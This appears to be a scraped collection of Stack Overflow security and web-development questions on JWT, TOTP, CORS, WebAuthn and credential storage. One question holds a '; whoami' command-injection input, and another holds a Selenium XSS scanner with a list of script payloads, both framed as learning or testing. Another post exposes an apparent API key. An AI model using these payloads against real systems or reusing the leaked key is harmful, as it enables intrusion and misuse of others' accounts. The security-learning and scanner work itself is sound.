<pre><code>2024-02-26T15:01:04.238+09:00  INFO 60005 --- [nio-8081-exec-1] JWT Verification and Authorization       : Token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0NiIsImF1dGgiOiJPV05FUiIsImlhdCI6MTcwODkyNDY0NiwiZXhwIjoxNzA4OTI4MjQ2fQ.TLjHCc1_ZtTbzGb-2c0ueLmxgCyxQf1rUQs4DkqMv_c
    2024-02-26T15:01:04.259+09:00  INFO 60005 --- [nio-8081-exec-1] JWT Verification and Authorization       : Authentication successful
    2024-02-26T15:01:04.259+09:00  INFO 60005 --- [nio-8081-exec-1] JWT Verification and Authorization       : Creating authentication object
    Hibernate: 
        /* &lt;criteria&gt; */ select
            u1_0.id,
            u1_0.email,
            u1_0.login_id,
            u1_0.password,
            u1_0.role 
        from
            users u1_0 
        where
            u1_0.login_id=?
    2024-02-26T15:01:04.330+09:00  INFO 60005 --- [nio-8081-exec-1] TestController                           : test controller
</code></pre>
<p>From the logs, I was able to confirm that the test controller is being called. However, the page does not load, and only the HTML code is displayed in the message.</p>
<p><strong>Developer Tools Message</strong>
<a href=""https://i.stack.imgur.com/NBXBE.png"" rel=""nofollow noreferrer"">enter image description here</a></p>
<p><strong>Test.html</strong></p>
<pre><code>&gt; &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt;
&gt;     &lt;meta charset=&quot;UTF-8&quot;&gt;
&gt;     &lt;script src=&quot;https://code.jquery.com/jquery-3.7.0.min.js&quot;
&gt;             integrity=&quot;sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=&quot;
&gt; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
&gt;     &lt;title&gt;Test Page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;This is a test page.&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt;
</code></pre>
<p><strong>Summary</strong></p>
<ol>
<li>After a successful login, you're redirected to the index page.</li>
<li>From this index page, the goal is to navigate to the test page.</li>
<li>I've confirmed that the authorization filter processes the request and the token value is passed along.</li>
<li>The request reaches the test controller, but the actual page fails to load.</li>
</ol>
<p>What could I possibly be missing? 😭😭😭 I've been wracking my brain over this for days,,, please help me,,,</p>
"
"<p>I have this piece of code</p>
<pre class=""lang-bash prettyprint-override""><code>echo &quot;Enter an user:&quot;
read user
cat /etc/passwd | grep $user
</code></pre>
<p>I'm trying to get a command injection through the user variable just to learn but I can't get it and I honestly don't know why.</p>
<p>Since the variable call is without quotes I'm supposed to be able to put something like <code>; whoami</code>, right?</p>
"
"<p>i have my react quill component, which returns something like this<br />
EXAMPLE:<br />
&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;fsdafsd&lt;/p&gt;&lt;p&gt;fsdfsda&lt;/p&gt;&lt;p&gt;fsdafsad&lt;/p</p>
<p>and that is content, and i wanna save it into database, but i'm not sure, i don't think that i have to save it as string because someone can imbed script into itt and it's not safe, can you help me how can i do this,</p>
<p>also when i'm saving it into dataabse i wanna somehow get same html string from database, to display it into website</p>
<p>i just tried to use library, to remove this html characters, but it saves only plane text, and i wanna retreat it from database as it was saved like html</p>
"
"<p>I'm trying to connect my MySql RDS instance to my Heroku environment securely, but I can't whitelist my ENV's ip address because (as I understand it) Heroku changes the ip address' at random.</p>
<p>Using the config vars with the DB credentials and connecting them with an ip of 0.0.0.0 in the security group works, but isn't a best practice security wise. What alternatives are available to me?</p>
<p>I've toyed with the idea of adding an ssl cert to my codebase, but this also doesn't seem like a very good idea.</p>
"
"<p>I am working on a react app which has old versions of most of the libraries being used in package.json file.</p>
<p>for e.g</p>
<pre><code>&quot;react&quot;: &quot;^16.3.1&quot;,
&quot;react-scripts&quot;: &quot;^3.0.1&quot;
...
</code></pre>
<p>While installing packages with the latest version of NodeJS (&gt;18), I got conflict dependencies errors so I used <code>npm install --legacy-peer-deps</code>.</p>
<p>With that my installation was successful, but when I went to run using npm start, it started to give an error related to webpack version 4.42.2.</p>
<p>I did debug and found one solution and updated the script like below,</p>
<pre><code>&quot;start&quot;: &quot;cross-env SKIP_FLIGHT_CHECK=true react-scripts --openssl-legacy-provider start&quot;
</code></pre>
<p>With the above, it starts running fine.</p>
<p>Now I want to check with this solution are there any changes to the security breach?</p>
<p>Or is it secure in terms of any attacks?</p>
"
"<p>I am trying to make XSS scanner using selenium. First I tried checking for XSS with the response until I realized that is a poor way to check. I started using Selenium because I thought it would be better at interacting with pages and able to detect the alert box popping up. I built a vulnerable website with a simple form and tested it, but it just fills the form without causing the alert to popup, here is code i used</p>
<pre><code>from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time

def check_xss(url, input_boxes):
    vulnerabilities = []
    
    payloads = [
        &quot;&lt;script&gt;alert('XSS')&lt;/script&gt;&quot;,
        &quot;&lt;img src='x' onerror='alert(\&quot;XSS\&quot;)'&gt;&quot;,
        &quot;&lt;svg/onload=alert('XSS')&gt;&quot;,
        &quot;&lt;svg&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&quot;,
        &quot;'\&quot;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&quot;,
        &quot;';alert('XSS');//&quot;,
        &quot;%3Cscript%3Ealert('XSS')%3C/script%3E&quot;
    ]

   
    driver = webdriver.Chrome()
    
    try:
        for input_box in input_boxes:
            if 'name' in input_box.attrs:
                print(f&quot;Testing for XSS on input box : {input_box['name']}&quot;)
                for payload in payloads:
              
                    driver.get(url)
                    
               
                    input_field = driver.find_element(By.NAME, input_box['name'])
                    
                  
                    input_field.send_keys(payload)
                    
                 
                    input_field.submit()
                    
      
                    time.sleep(1)
                    
          
                    try:
                        alert = driver.switch_to.alert
                        vulnerabilities.append({
                            'type': 'XSS',
                            'input_param': input_box['name'],
                            'payload': payload,
                            'result': f'XSS Success with payload : {payload}'
                        })
                        print(f&quot;XSS Success with payload : {payload}&quot;)
                        alert.accept()  # Close the alert dialog
                    except:
                        pass  # No alert dialog appeared, so continue testing

    finally:
        # Close the browser
        driver.quit()

    if not vulnerabilities:
        print(f&quot;No XSS vulnerability found for input box: {input_box['name']}&quot;)

    return vulnerabilities

</code></pre>
<p>With this it just fills the form and doesnt trigger the alert box, even though i know its XSS vulnernable and when maunually doing the attack the alert box appears.</p>
<p>How can I get this to actually check for XSS</p>
<p>I can't figure out how to make this work, ive tried increasing the timeout but it didnt do anything</p>
"
"<p>I added my github projects to snyk.io portal to check vulnerabilities. Sadly, snyk is only checking files ending with the .json, .yml, .txt etc. It's not checking vulnerabilities in typescript, js, java, python files. I tried this couple times, same result, no change. Any suggestion?</p>
<p><a href=""https://i.stack.imgur.com/VaqjD.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/VaqjD.png"" alt=""snyk output"" /></a></p>
"
"<p>I have security.php:</p>
<pre><code>&lt;?php
session_start();
if (!isset($_SESSION['logged']) || !$_SESSION['logged'] ) {
    header(&quot;location:/backoffice/login.php&quot;);
    session_destroy();
} 
</code></pre>
<p>And my controller usersControll.php:</p>
<pre><code>&lt;?php
include &quot;security.php&quot;;
include &quot;users.php&quot;; //model 

$option = filter_input(INPUT_POST, 'option', FILTER_SANITIZE_NUMBER_INT);

switch ($option) {
    cases...
    case 9:
        $user = filter_input(INPUT_POST, 'user', FILTER_SANITIZE_STRING);
        $passwd = filter_input(INPUT_POST, 'passwd', FILTER_SANITIZE_STRING);
        logInLogOut::logIn($user, $passwd);
        break;
    case 10:
        logInLogOut::logOut();
        break;
    More cases...
}


</code></pre>
<p>The problem is when I log in, it enters inside the switch (controller) ignoring security.php. It shouldn't go in because $_SESSION['logged'] isn't set. I send the logIn data to the controller from a form and it send the switch option (9) through the form too with a hidden input.</p>
<p>I expect to not enter in the switch and it enters in all time, i tried switching session values and conditions but didnt work</p>
"
"<p>The option to create dynamic certificates in ZAP is not available. I am running it on a local machine<a href=""https://i.stack.imgur.com/G8BSM.png"" rel=""nofollow noreferrer"">enter image description here</a>.</p>
<p>Does anyone know whether it's been removed? If not, where/how do I get to it?</p>
<p>I tried looking for in extensions and tried reinstalling.</p>
"
"<p>hello please i need to add 2FA to my mern project i have implemented this using speakeasy before it was working but now i had a problem when i create account and generate QR code and i scan it using authenticator , it's not the same twoFactorSecret
when i try to receive Token from twoFactorSecret it's working but with QR code not working
this is my model :</p>
<pre class=""lang-js prettyprint-override""><code>// Model: User.js
const UserSchema = new mongoose.Schema({
    firstName: {
        type: String,
        required: true,
        min: 2,
        max: 50,
    },
    lastName: {
        type: String,
        required: true,
        min: 2,
        max: 50,
    },
    email: {
        type: String,
        required: true,
        max: 50,
        unique: true,
    },
    password: {
        type: String,
        required: true,
        min: 5,
    },
    picturePath: {
        type: String,
        default: &quot;&quot;,
    },
    twoFactorSecret: {
        type: String,
        default: &quot;&quot;,
    },
    isTwoFactorEnabled: {
        type: Boolean,
        default: true,
    },
    verified: {
        type: Boolean,
        default: true
    },
    refreshToken: {
        type: String,
        default: &quot;&quot;
    }
},
{ timestamps: true });

const User = mongoose.model(&quot;User&quot;, UserSchema);
export default User;

// Register Endpoint
const { firstName, lastName, email, password } = req.body;

// Check if the user already exists
const existingUser = await User.findOne({ email: email });

if (existingUser) {
    return res.status(400).json({ msg: &quot;An account with this email already exists.&quot; });
}

// Hash the password
const saltRounds = 10;
const salt = await bcrypt.genSalt(saltRounds);
const passwordHash = await bcrypt.hash(password, salt);

// Create new user with hashed password
const newUser = new User({
    firstName,
    lastName,
    email,
    password: passwordHash,
});

// Generate a 2FA secret for the user
const secret = speakeasy.generateSecret({ length: 20 });
newUser.twoFactorSecret = secret.base32;

// Save the user to the database
const savedUser = await newUser.save();

let qrCodeUrl;
if (savedUser.isTwoFactorEnabled) {
    // Generate a QR code URL for the user to scan with a 2FA app
    qrCodeUrl = await QRCode.toDataURL(
        speakeasy.otpauthURL({
            secret: secret.base32,
            label: encodeURIComponent(`YourAppName:Elkendy`),
            issuer: &quot;Elkendy&quot;,
        })
    );

    /*     // Update the user's profile to reflect that 2FA is enabled
    await User.findByIdAndUpdate(savedUser._id, { isTwoFactorEnabled: true }); */
}
</code></pre>
<p>In the register endpoint, you're registering a new user. First, you check if the user already exists in the database. If not, you hash the password, create a new user object, generate a two-factor authentication secret, and save the user to the database. If two-factor authentication is enabled for the user, you generate a QR code URL using speakeasy's otpauthURL method.</p>
<pre class=""lang-js prettyprint-override""><code>// Verify 2FA Endpoint
export const verify2FA = async (req, res) =&gt; {
    try {
        const { email, password, token: twoFAToken } = req.body;

        const user = await User.findOne({ email: email });
        if (!user) return res.status(400).json({ message: &quot;User does not exist.&quot; });

        const isMatch = await bcrypt.compare(password, user.password);
        if (!isMatch) return res.status(400).json({ message: &quot;Invalid credentials.&quot; });

        //verify the 2fa token
        const verifiedtwofa = speakeasy.totp.verify({
            secret: user.twoFactorSecret,
            encoding: &quot;base32&quot;,
            token: twoFAToken,
            window: 4, // Allows for a 30-second
        });

        if (verifiedtwofa) {
            // Token is verified, issue a JWT
            const jwtToken = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
                expiresIn: &quot;1h&quot;,
            });

            await User.updateOne(
                { _id: user._id },
                { $set: { isTwoFactorEnabled: false } }
            );

            return res.status(200).json({
                token: jwtToken,
                user: { id: user._id, email: user.email, isTwoFactorEnabled: false },
            });
        } else {
            console.error(`Failed 2FA verification. User: ${email}, Token provided: ${twoFAToken}`);
            res.status(400).json({ message: &quot;Invalid 2FA token.&quot; });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
};
</code></pre>
<p>In the verify 2FA endpoint, you verify the two-factor authentication token provided by the user. First, you find the user by email, then check if the provided password matches the stored password hash. After that, you verify the 2FA token using speakeasy's totp.verify method. If the token is verified, you issue a JWT token and update the user's profile to reflect that 2FA is disabled.</p>
"
"<p><strong>Desired outcome:</strong></p>
<ol>
<li><p>I log into Windows Server 2019, that is domain-joined, using an Active Directory account, that is a local adminsitrator, but not a domain administrator.</p>
</li>
<li><p>I initiate launching of a Python 3 script, that runs as a service, a worker. It would be stopped only for maintenance. Python 3 is installed. Python 2 is not installed and I want to avoid installing it.</p>
</li>
<li><p>I am prompted to enter the password</p>
</li>
<li><p>If I enter the correct password, Python project is extracted from a password-protected, encrypted archive (of any format) directly into RAM, and then started there</p>
</li>
</ol>
<p>The key requirement is to prevent people, that don't have the password for that Active Directory account and don't know the archive's password, from accessing the Python project files (scripts, dependencies, local database-like files, configuration).</p>
<ol start=""5"">
<li>Changes, made to archive database-like files, are persisted back to the password-protected archive, while the project is running</li>
</ol>
<p><strong>Reasoning:</strong> The project contains data, that cannot be trusted to the entire group of domain administrators. I cannot influence the permissions of domains administrators.</p>
<p><strong>The question:</strong></p>
<p>What options do I have for securing access to the project that way?</p>
<p>I have done a research and, apparently, a virtual local drive (ramdisk), mapped only to the current Windows user session, is the way to go (Dokan's memfs seems the fastest way). But maybe there are other ways to run Python scripts from RAM? I mean, apart from &quot;exec&quot; or python.exe's argument &quot;-c&quot; - the scripts are big and include references to other script files. MemFS from PyFilesystem project seems to support that only for Python 2. Creating a custom import hook for sys.path does not seem to be an option. Also, ideally, unpacking from the archive would need to be done directly into RAM, bypassing temp locations on the disk. It seems, that a local mount point (mapped local folder or drive letter, pointing to RAM) need to exist in Windows before the unpacking starts.</p>
<p>Abstracting sensible data away from the scripts also does not seem feasible, as the project is huge and that data is already all over the place.</p>
<p>Thanks</p>
"
"<p>Recently I implemented an AMSI provider based on MS samples to intercept scripts execution and scan script content before it executed (<a href=""https://github.com/Microsoft/Windows-classic-samples/tree/main/Samples/AmsiProvider"" rel=""nofollow noreferrer"">https://github.com/Microsoft/Windows-classic-samples/tree/main/Samples/AmsiProvider</a>). In amsi.h I found <code>AMSI_UAC_REQUEST_TYPE</code> enum with very interesting fields like <code>AMSI_UAC_REQUEST_TYPE_EXE</code>, <code>AMSI_UAC_REQUEST_TYPE_COM</code>... but I can't understand how to utilize it, which callback should I use to intercept UAC request?</p>
"
"<p>I have a situation where I would like to share my Production TrustStore JKS file with R&amp;D for them to develop a script required for migration. What are the security problems here? How risky is that and how potentially it can be used?</p>
<p>I have tried to create a dummy TrustStore, but it differs from the production version, exhibiting some inconsistencies that I would like to avoid.</p>
"
"<p>I'm attempting to utilize the taxii2-client library in Python to connect to a Pulse Dive TAXII 2.1 server for threat intelligence exchange. However, I'm encountering difficulties with connecting to pulse dive CTi feed. Could someone provide guidance on how to properly implement this connection using the taxii2-client library?</p>
<p>Current Setup: I'm working in a Python environment and using the taxii2-client library for my TAXII client implementation.
Objective: My goal is to establish a connection with the Pulse Dive TAXII 2.1 server to retrieve threat intelligence data.
Issue: I'm facing the following problem of not able to authenticate via api key, nor the library gives an option to include authentication headers. it only provides authentication methods using user name and password</p>
<p>in the code snippet below</p>
<pre><code>from taxii2client.v21 import Collection

collection = Collection(&quot;https://pulsedive.com/taxii2/api/collections?accept=application%2Ftaxii%2Bjson%3Bversion%3D2.1&amp;pretty=1&amp;key=bbcff74cf8442edcc8d52a4b61ec9a58912e0b018bbb473c0f08136595676723&quot;)

print(collection.get_objects())
</code></pre>
<p>the provided url has an api key included but i am getting 401 error(not authenticated)
Any way i can get around this?</p>
<p>i tried everything thats mentioned in pulse dive documentation<br />
<a href=""https://pulsedive.com/api/taxii"" rel=""nofollow noreferrer"">link</a>
Also explored other libraries like cabby but it lacked taxii2.1 support</p>
"
"<p>In my project, I am using <code>androidx.security:security-crypto-ktx</code> library for EncryptedSharedPreference. Now I have to use <code>com.google.crypto.tink:apps-paymentmethodtoken</code> library.</p>
<p>When I am trying to use these both together, I am getting this error for all the files inside tink-android module.</p>
<blockquote>
<p>Caused by: java.lang.RuntimeException: Duplicate class com.google.crypto.tink.AccessesPartialKey found in modules jetified-tink-1.8.0 (com.google.crypto.tink:tink:1.8.0) and jetified-tink-android-1.8.0 (com.google.crypto.tink:tink-android:1.8.0)</p>
</blockquote>
<p>I have tried updating both the libraries to their latest version but the issue still persists.
I have also tried excluding the module from the library like this</p>
<blockquote>
<p>exclude(group = &quot;com.google.crypto.tink&quot;, module = &quot;tink-android&quot;)</p>
</blockquote>
<p>but when I do this with androidx-security library then I get class not found exception with EncryptedSharedPreference's file.</p>
<p>Has anyone else faced similar issue like this? Or any idea how can I resolve this?</p>
"
"<p>I'm working on integrating WebAuthn into my web application and encountering an issue specifically with Windows Hello and the handling of <code>allowCredentials</code>. When I don't specify <code>allowCredentials</code>in the <code>publicKeyCredentialRequestOptions</code>, I get a prompt allowing me to choose from available credentials, and upon selection, I'm then asked to enter the PIN for the selected credential. This flow works as expected.</p>
<p>However, my goal is to streamline the process by pre-selecting the credential using <code>allowCredentials</code>, thus skipping the credential selection step. When I do specify <code>allowCredentials</code>with the correct credential ID, the expected PIN prompt does not appear. Instead, I'm only presented with two options: &quot;iPhone, iPad, or Android device&quot; and &quot;Security Key&quot;.</p>
<p>Here's the code snippet for context:</p>
<pre><code>const publicKeyCredentialRequestOptions = {
    challenge: serverChallenge,
    rpId: window.location.hostname,
    userVerification: 'required',
    allowCredentials: [
        {
            type: &quot;public-key&quot;,
            id: allowCredentials[0].id,
        }
    ],
};

const credential = await navigator.credentials.get({
    publicKey: publicKeyCredentialRequestOptions
});
</code></pre>
<p>The <code>allowCredentials[0].id</code> is verified to be correct. The issue is that specifying <code>allowCredentials</code> emphasized textseems to bypass the PIN entry step for Windows Hello, directly prompting for an alternate authentication method instead.</p>
<p>Has anyone faced a similar issue or have insights on why the PIN prompt is bypassed in this case? Any advice on how to ensure the PIN prompt appears when <code>allowCredentials</code> is used would be greatly appreciated.</p>
<p>Thank you for your assistance!</p>
"
"<p>I'm writing own implementation of TOTP on Rust, but I can`t get correct 2FA code with given secret.</p>
<pre><code>use std::{process::exit, time::{SystemTime, UNIX_EPOCH}};

use sha1::{Sha1, Digest};

fn hmac(key: Vec&lt;u8&gt;, text: Vec&lt;u8&gt;) -&gt; Vec&lt;u8&gt;{
    let mut key = key;
    const SIZE: usize = 64;
    if key.len() &gt; SIZE {
        key = Sha1::digest(&amp;key).to_vec();
    }
    if key.len() &lt; SIZE {
        for _ in 0..(SIZE-key.len()){
            key.push(0);    
        }
    }
    let ipad = 0x36;
    let opad = 0x5C;
    let mut ikeypad: Vec&lt;u8&gt; = key.iter().map(|val| {val^ipad}).collect();
    let mut okeypad: Vec&lt;u8&gt; = key.iter().map(|val| {val^opad}).collect();
    ikeypad.extend(&amp;text);
    let inner_hash: Vec&lt;u8&gt; = Sha1::digest(&amp;ikeypad).to_vec();
    okeypad.extend(&amp;inner_hash);
    let outer_hash: Vec&lt;u8&gt; = Sha1::digest(okeypad).to_vec();
    return outer_hash;
}

fn totp(key: &amp;String, size: u8, x: u16) {
let time = 1000000;
//SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
    let t = time / (x as u64);
    let mut time_vec: Vec&lt;u8&gt; = Vec::new();
    for i in (0..8).rev(){
        time_vec.push(((t &amp; (0xFF &lt;&lt; i*8)) &gt;&gt; i*8) as u8)
    }
    let hmac_vec = hmac(key.as_bytes().to_vec(), time_vec);
    let offset: u8 = hmac_vec[19] &amp; 0xf;
    let hmac_truncated: Vec&lt;u8&gt; = hmac_vec[(offset as usize)..=((offset+3) as usize)].to_vec();
    let code_num = ((hmac_truncated[0] as u64 &amp; 0x7F) &lt;&lt; 24) | ((hmac_truncated[1] as u64 &amp; 0xFF) &lt;&lt; 16) | ((hmac_truncated[2] as u64 &amp; 0xFF) &lt;&lt; 8) | ((hmac_truncated[3] as u64 &amp; 0xFF));
    dbg!(code_num % 10_u64.pow(size as u32));
}
fn main() {
    totp(&amp;&quot;JBSWY3DPEHPK3PXP&quot;.to_string(), 6, 30);
    
}
</code></pre>
<p>I tried everything. And discover RFC docs about TOTP and HOTP, and rewrite methods, and look through the internet for other implementations.
With this data I have 832112, while should 041374</p>
"
"<p>Our users can run mathematical calculations based on form fields. To evaluate the calculation, I'm using <strong>expr-eval</strong> as expression evaluator for javascript (client side) (<a href=""https://github.com/silentmatt/expr-eval"" rel=""nofollow noreferrer"">https://github.com/silentmatt/expr-eval</a>).</p>
<p>An example expression is: <code>x = 10; 2 + (4*x)</code></p>
<p>For security reasons, we should verify the result of the calculation on server side as well. Therefore, I want to re-run the calculation with the incoming data on the server using PHP, after the form has been submitted.</p>
<p>How would I do that? <strong>expr-eval</strong> comes with a lot of possibilities like ternary conditions, variable declarations and so on. As there is no equivalent library for PHP, what would be the way of running such a verification? I could setup a Node.js server running the <strong>expr-eval</strong>, but would an additional request really be the best practice here?</p>
"
"<p>I have a .NET API and React SPA hosted on the same domain (api.domain.com and app.domain.com).</p>
<p>I am using same-site=strict, secure and httponly cookies for communication from the SPA to the API. I also have strict CORS rules setup. I also want to add anti forgery tokens, but can't find any good solutions for this. So what im thinking of doing is:</p>
<ol>
<li>once user is logged in, call endpoint /api/csrf to get a anti-csrf token. This will be placed in local storage.</li>
<li>on every request, attach it as a header</li>
<li>when a request is received, using a middleware: check if the user is authenticated with a cookie (I also have to support daemon apps calling the API with bearer tokens, in these cases, skip the CSRF check), and check if the token is valid. Return 400/401 if it is not.</li>
</ol>
<p>I'm using OpendIdConnect to issue out the cookies using auth code flow against AD FS. Does the MS OIDC lib have any way to issue out anti-forgery tokens as well? If not, can I just create tokens and add them to an in-memory cache, and only allow cookie requests if the token exists in the cache? Or is this too &quot;loose&quot; CSRF check?</p>
"
"<p>I'm working on a fork of Graphene OS and I'm new in android development too.
How would it be possible adding a new System app into the build? E.g. Briar, that is an external App? Or generally how it can be done on a Android OS in theory? E.g a solution in lineage OS would be great too.
What have beem done?</p>
<p>Best regard and I hope someone could help.</p>
<p>I added my repo into the plattform manifest and did a folder of external/Apps in my repo.</p>
"
"<p>I'm using cookie_store to store my user session:</p>
<pre><code>Rails.application.config.session_store :cookie_store, key: '_session', expire_after: 1.month
</code></pre>
<p>I trust that this does what the library says...but when I decrypted an actual cookie from production, I found</p>
<pre><code>&quot;{&quot;session_id&quot;:&quot;42193dc27a12fca399509e6b6bb29751&quot;,&quot;_csrf_token&quot;:&quot;EIqxBDqpUX1Bxmig1WXekbCExnhq4LP5D1JDYfoI8tA&quot;,&quot;app_field1&quot;: ...}&quot;
</code></pre>
<p>(don't worry this cookie is from over a month ago so it's not a security risk to leak it)</p>
<p>Obviously rails set <code>session_id</code> and <code>_csrf_token</code>. But none of these are timestamps. How does rails know when this cookie should expire? Does session_id actually get decoded into a timestamp?</p>
<p>It's important to me that these cookies do expire because I'm wary of session replay attacks.</p>
"
"<p><img src=""https://i.stack.imgur.com/0m1UX.png"" alt=""POSTMAN PROXY CONFIGURATION"" /></p>
<p><img src=""https://i.stack.imgur.com/JePrJ.png"" alt=""OWASP ZAP PROXY CONFIGURATION"" /></p>
<p>I'm trying to do vulnerability scanning API. but when I send the Postman with post method, it don't get detect by OWASP ZAP or don't get send to OWASP ZAP.</p>
<p>I try to use IP 127.0.0.1 but OWASP ZAP don't allow it. Are there any tips to solve the issue?</p>
"
"<p>i'm currently running a laravel script in cpanel in debug mode true. Is they any way if that somebody can  read my .env file? as it has got all the details</p>
<p>i want that env file to be hidden incase if someboady can read that file in debug mode</p>
"
"<p>Hello everyone can someone help me configure AMADEUS-Exploit: Automated vulnerability and Exploits Management I installed the necessary packages but when I want to run it it shows me an error message that a package is missing is not installed here is the link to this program: <a href=""https://github.com/IDEA-Research-Group/AMADEUS"" rel=""nofollow noreferrer"">https://github.com/IDEA-Research-Group/AMADEUS</a></p>
<p>analysis and testing of cybersecurity vulnerabilities of configuration</p>
"
"<p>It's clear that you could substitute request headers. But If I were one who invented CORS, I would make sure that at least my API host IP is the same to IP request made from.</p>
<p>Imagine we have <code>Access-Control-Allow-Origin: https://mywebsite.org</code> set.
Attacker can substitute headers, request body etc.</p>
<p>But how can he substitude his IP address (using VPN or any proxies - looks like nope)?</p>
<p>mywebsite.org is linked to some IP, and I would at least check that request is done from the same IP even if request headers substituted.</p>
<p>I have just heard that it's this is not taken into account or is not possible in HTTP protocol context. For me then CORS make no sense.</p>
"
"<p>We are setting up mutual authentication using Jetty. Everything is working but authentication is also successful even when the hostname doesn't match the certificates.</p>
<p>We assume that hostname verification is the default behavior so what could be the reason here?</p>
<p>Or should we programmatically do hostname verification ourselves?</p>
<p>Using <strong>Jetty Version 9.4.53</strong></p>
"
"<p>If I run <code>db.auth(&quot;myusername&quot;, &quot;mypassword&quot;)</code> in an instance of <code>mongosh</code>, and then I open <code>.mongodb/mongosh/mongosh_repl_history</code> from my home directory in my editor, I see the password has clearly been saved to this file in cleartext. How do I prevent this from occurring?</p>
<p>I'm using MongoDB Community Edition 7.0 on MacOS Sonoma 14.3.1</p>
"
"<p>I'm trying to understand a part of the <em>general philosophy</em> behind JWTs.</p>
<p>I've read in several articles around the internet that <strong>JWTs are irrevocable by design</strong>. In other words, once a valid token is issued, there is no way to revoke it other than just waiting for it to expire, unless I keep some sort of state on the server which would seem to defeat the #1 benefit of using JWTs. Please correct me if this is a faulty premise for my understanding.</p>
<p>What I'm trying to understand is <strong>how can this possibly be considered an acceptable tradeoff?</strong> If someone managed to get a passkey to my house, I'd never just be like &quot;Well, you have 5 minutes until the code expires to poke around as much as you want and grab what you can.&quot; The idea is laughable, I'd want the person's access revoked <em>immediately</em>. But isn't that how we're treating user data with JWTs? I'm hoping that I'm grossly misunderstanding this!</p>
<p>I can never guarantee that a malicious party won't somehow manage to get a user's JWT due to mistakes on their part, but it seems like it would be a standard expectation for me to offer my users the ability to at least log themselves out everywhere (revoking access for all unexpired tokens) so that malicious party's access can be blocked immediately.</p>
<p>So here are my thought questions:</p>
<ul>
<li>If this tradeoff is indeed considered acceptable, why?</li>
<li>Doesn't this make JWTs a complete no-go for stricter security requirements like HIPAA or are there approaches for getting around this problem with JWTs? If there are solutions, I'd love to see some links to articles that dive into possible implementations. Are there still advantages to using JWTs with potential workaround to this problem versus good old-fashioned server-side session storage, and what are the advantages?</li>
</ul>
"
"<p>I have an application that calls an web api to validate its license, the license is signed by private key and validated by public key on the client machine. Lets say that some 'attacker' found a workaround and have setup a custom http server and have modified hosts file to redirect my application to that server, he is also able to modify the public key by decompiling and altering my application code, effectively he is able to issue his own application licenses.</p>
<p>Now my question is assuming that I will be able to protect the applications public key from tampering what would be a correct way to verify that hosts file is not compromised and application is actually calling my own http server.</p>
<p>Some potential solutions I can think of is to call my api with its http server static IP and include the host in the headers, still I would assume it would be possible to alter the request by other means like some kind of proxy?</p>
<p>Another thought is to send an small payload to my api and sign it, then on client side the signature could be verified, since the 'attacker' does not possesses the private key he would not be able to produce correct payload. Of course this would only work if my application public key cant be compromised.</p>
<p>Any ideas comments are greatly appreciated.</p>
"
"<p>I have the following code:</p>
<pre><code>class Server:
    def __init__(self):
        #server credentials
        self.ip = &quot;192.168.1.182&quot;
        self.user = &quot;bank_user&quot;
        self.password = &quot;*mypass*&quot;
        self.port = 3307
        self.database = &quot;bank&quot;
    def connect_to_server(self):
        try:
            self.mydb = mysql.connector.connect(
                host = self.ip,
                user = self.user,
                password = self.password,
                port = self.port,
                database = self.database
                )
            self.mycursor = self.mydb.cursor()
            print(&quot;✓ Server connection estabilished&quot;)
            rlist = [True]
</code></pre>
<p>The problem is, I don't want to store it in my code because I feel that it's not safe
I'm creating a banking app (just for fun) so it will be used as .py-&gt;<strong>.exe</strong> later by users not only from my pc. I shouldn't be stored in a config file or a plaintext file, because if someone gets the credentials he can basically log into the MySQL database and modify all of the data.
So no:</p>
<ul>
<li>Enviromental variables</li>
<li>Plaintext/ config file</li>
<li>It should work on any pc (I'm using pytoexe to convert my python file to exe, so that everyone can run the app)
<strong>I'm new to stackoverflow so forgive me if I wrote sth wrong</strong></li>
</ul>
<p>I thought about creating a password encryption, but anyone who gets the decryption key can decrypt the password. I also thought about creating my own encryption method, but anyone who gets to my code can just use the decrypting function and execute it for example: decryptor(&quot;encryptedpassword&quot;)</p>
"
"<p>I've been doing a lot of reading on V8 Bytecode, specifically <a href=""https://github.com/bytenode/bytenode"" rel=""nofollow noreferrer"">Bytenode</a> and <a href=""https://electron-vite.org/guide/source-code-protection#customizing-protection"" rel=""nofollow noreferrer"">Electron-Vite's implementation</a>, and how they are advertised as a way to protect source code, but that doesn't actually seem to be the case.</p>
<p>Reading <a href=""https://stackoverflow.com/questions/57052153/how-to-decompile-bytenode-jsc-files"">this stackoverflow post</a> suggests that decompiling Bytecode would be possible due to being able to see V8's JS-to-bytecode compiler, thus, being able to reverse the operation.</p>
<p>Alongside that, it seems a decompiler was actually created, and is available <a href=""https://github.com/PositiveTechnologies/ghidra_nodejs"" rel=""nofollow noreferrer"">here</a>. Although it is outdated, I'm guessing it could be done again with updated versions of V8. <a href=""https://swarm.ptsecurity.com/how-we-bypassed-bytenode-and-decompiled-node-js-bytecode-in-ghidra/"" rel=""nofollow noreferrer"">This article</a> describes the process used to create the decompiler and seems to have a good understanding of the inner workings of the interpreter, and, without that insight, it seems it would've been much harder to create the decompiler.</p>
<p>My question is this, if someone didn't know how the interpreter worked, would V8 bytecode be un-decompilable and considered &quot;secure&quot;? Secure here meaning the same as modern day encryption, i.e. the time to brute force / guess how the interpreter worked would be so long that it is considered secure.</p>
"
"<p>My company has decided to expose our database(s) directly to the internet so they can be consumed in PowerBI.</p>
<p>The business is B2B, and we create one DB per client in Azure.  The information contained could be highly sensitive trade secrets.  Clients are given a static username/pwd with read-only access in order to connect from PowerBI.  Access can be restricted by IP, however users can (and so, will) disable that.</p>
<p>An alternative suggested was a GraphQL endpoint on our backend, merging the data within a single DB and using our existing user authentication (AzureB2C) system to gate access.</p>
